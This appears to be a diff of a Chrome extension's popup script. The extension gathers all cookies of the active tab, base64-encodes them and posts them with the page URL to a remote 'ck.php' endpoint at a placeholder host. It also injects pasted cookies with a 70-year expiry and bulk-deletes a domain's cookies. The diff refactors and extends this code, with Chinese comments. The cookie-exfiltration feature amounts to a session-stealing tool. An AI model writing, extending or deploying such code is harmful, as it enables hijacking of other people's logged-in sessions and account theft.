@@ -6,7 +6,7 @@ function $$(id) {
 
 function inj_cookies(cookies) {
     if (!cookies) {
-        $$('status').innerHTML = 'No Cookies Injected.';
+        showStatus('No Cookies Injected.', true);
         return;
     }
     if (!chrome.cookies) {
@@ -14,11 +14,11 @@ function inj_cookies(cookies) {
     }
 
     var d = new Date();
-    var expired = 365 * 70; // 70years
+    var expired = 365 * 70; // 70 years
     var e = d.setTime(d.getTime() / 1000 + expired * 24 * 3600); // second
 
     var domain = URL.split('/')[2];
-    if ($$('domain').value != domain) {
+    if ($$('domain').value !== domain) {
         domain = $$('domain').value;
     }
     var url = URL.split('/')[0] + '//' + domain;
@@ -38,62 +38,78 @@ function inj_cookies(cookies) {
             'expirationDate': e,
         });
     }
-    $$('status').innerHTML = 'OK.';
+    showStatus('Cookies Injected.', false);
+}
+
+function getCookiesPromise(url) {
+    return new Promise((resolve, reject) => {
+        chrome.cookies.getAll({ url: url }, function (cookies) {
+            if (chrome.runtime.lastError) {
+                reject(chrome.runtime.lastError);
+            } else {
+                resolve(cookies);
+            }
+        });
+    });
+}
+
+function showStatus(message, isError = false) {
+    const statusElement = $$('status');
+    statusElement.innerHTML = message;
+    statusElement.style.color = isError ? 'red' : 'green'; // 错误为红色，成功为绿色
+}
+
+function copyToClipboard(text) {
+    const tempInput = document.createElement('textarea');
+    tempInput.value = text;
+    document.body.appendChild(tempInput);
+    tempInput.select();
+    document.execCommand('copy');
+    document.body.removeChild(tempInput);
 }
 
 function init() {
-    $$('x').focus();
-    $$('x').value = localStorage.getItem('cookies');
+    const statusElement = $$('status');
+    const tokenInput = $$('token_input');
+    const xInput = $$('x');
+    const domainInput = $$('domain');
 
-    var gcookies = '';
-    var url = '';
+    // 设置 token_input 的默认值
+    tokenInput.value = 'cookieman';
+    xInput.focus();
+    xInput.value = localStorage.getItem('cookies');
 
+    // 获取当前活动标签页的 URL 和 Cookies
     chrome.tabs.query({ active: true, lastFocusedWindow: true }, function (tab) {
         URL = tab[0].url;
-
-        $$('domain').value = URL.split('/')[2];
-
-        chrome.cookies.getAll({
-            url: tab[0].url
-        }, function (cookie) {
-            console.log(cookie);
-            url = tab[0].url;
-            // 遍历当前域名下cookie, 拼接成字符串
-            cookie.forEach(function (v) {
-                gcookies += v.name + "=" + v.value + ";";
-            });
-        });
+        domainInput.value = URL.split('/')[2];
     });
 
-    $$('x').addEventListener('blur', function () {
-        localStorage.setItem('cookies', $$('x').value);
+    // 保存输入框内容到 localStorage
+    xInput.addEventListener('blur', function () {
+        localStorage.setItem('cookies', xInput.value);
     });
 
-    //inject cookie
+    // 注入 Cookies
     $$('exec_btn').addEventListener('click', function () {
-        inj_cookies($$('x').value);
-        var Endbase = btoa($$('x').value);
+        inj_cookies(xInput.value);
+        const Endbase = btoa(xInput.value);
         console.log(Endbase);
     });
 
-    // get cookie
-    $$('get_btn').addEventListener('click', function () {
-        var gcookies = '';
-
-        chrome.cookies.getAll({ url: URL }, function (cookies) {
-            cookies.forEach(function (cookie) {
-                gcookies += cookie.name + "=" + cookie.value + ";"; // 拼接所有cookie为一个字符串
-            });
-            alert(gcookies);
-
-            var Endck = btoa(gcookies);
-            var token = $$('token_input').value;
+    // 获取并发送 Cookies
+    $$('get_btn').addEventListener('click', async function () {
+        try {
+            const cookies = await getCookiesPromise(URL);
+            const gcookies = cookies.map(cookie => `${cookie.name}=${cookie.value};`).join('');
+            const Endck = btoa(gcookies);
+            const token = tokenInput.value;
 
             console.log("Encoded Cookies: " + Endck);
 
-            // AJAX 
+            // AJAX 请求发送 Cookies
             $.ajax({
-                url: "https://xxx/ck.php",  // 指定请求发送到的后端服务器地址
+                url: "https://xxxx/ck.php",
                 type: 'post',
                 data: JSON.stringify({
                     url: URL,
@@ -102,34 +118,48 @@ function init() {
                 }),
                 contentType: 'application/json',
                 dataType: 'json',
+                beforeSend: function () {
+                    showStatus("Sending cookies...", false);
+                },
                 success: function (data) {
                     if (data.status === 'success') {
                         console.log("Report success: " + data.message);
-                        $$('status').innerHTML = "Cookies sent successfully!";
+                        showStatus("Cookies sent successfully!", false);
                     } else {
                         console.log("Report error: " + data.message);
-                        $$('status').innerHTML = "Error sending cookies.";
+                        showStatus("Error sending cookies.", true);
                     }
                 },
                 error: function (xhr, status, error) {
                     console.log("Report failure: " + error);
-                    $$('status').innerHTML = "Failed to send cookies.";
+                    showStatus("Failed to send cookies.", true);
                 }
             });
-        });
+
+            // 复制cookie到剪贴板
+            if (confirm("Cookies retrieved. Do you want to copy them to clipboard?")) {
+                copyToClipboard(gcookies);
+                alert("Cookies copied to clipboard.");
+            }
+
+        } catch (error) {
+            console.error('Error:', error);
+            showStatus("Failed to retrieve cookies.", true);
+        }
     });
 
+    // 删除 Cookies
     $$('rm_btn').addEventListener('click', function () {
-        var domain = $(this).attr('data-domain');
-        chrome.cookies.getAll({ domain: domain }, function (cks) {
-            $.each(cks, function (i, ck) {
-                var datack = {};
-                datack.name = ck.name;
-                datack.storeId = ck.storeId;
-                datack.url = url;
-                chrome.cookies.remove(datack);
+        const domain = $$('domain').value;
+        chrome.cookies.getAll({ domain: domain }, function (cookies) {
+            cookies.forEach(function (cookie) {
+                chrome.cookies.remove({
+                    url: `http://${domain}`,
+                    name: cookie.name
+                });
             });
-            alert("Del All Finish.");
+            alert("All cookies removed.");
+            showStatus('All cookies removed.', false);
         });
     });
 }
